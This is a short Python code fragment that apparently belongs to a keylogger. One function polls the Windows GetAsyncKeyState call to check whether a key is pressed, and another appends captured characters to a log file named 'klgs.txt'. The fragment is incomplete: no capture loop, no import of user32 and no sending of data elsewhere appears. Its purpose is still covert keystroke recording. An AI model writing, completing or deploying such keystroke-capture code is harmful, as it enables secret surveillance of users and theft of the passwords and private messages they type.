def get_key_state(vk):
    return user32.GetAsyncKeyState(vk) & 0x8000 != 0

def write_to_file(char, filename='klgs.txt'):
    try:
        with open(filename, 'a') as f:
            f.write(char)
    except Exception as e:
        print(f'An error occurred: {e}')

